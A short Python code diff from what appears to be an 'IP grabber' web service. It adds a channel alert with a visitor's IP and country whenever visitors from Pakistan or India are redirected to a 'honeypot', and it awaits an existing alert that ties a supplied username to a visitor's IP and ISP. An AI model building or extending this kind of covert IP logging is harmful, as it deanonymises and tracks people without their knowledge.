@@ -82,6 +82,13 @@ async def redirect_handler(ip ,normal_server, honeypot):
         
     if country_code and country_code in ['PK', 'IN']:
         l.info(f"Rediredcting to Honeypot: {honeypot}")
+        send_to_channel(f'''
+Honeypot triggered:
+Honeypot: {honeypot}
+IP: {ip}
+Country: {country_code}
+More infos: https://iplocation.com/?ip={ip}
+''')
         return redirect(honeypot)
     
     else:
@@ -114,7 +121,7 @@ async def ip_grab(dc_handle):
         isp = data['isp']
         dc_handle += '?'
         l.info(f'data is: {data}')
-        send_to_channel(f'''
+        await send_to_channel(f'''
 IP Grabber called:
 Username provided: {dc_handle}
 IP: {ip_address}
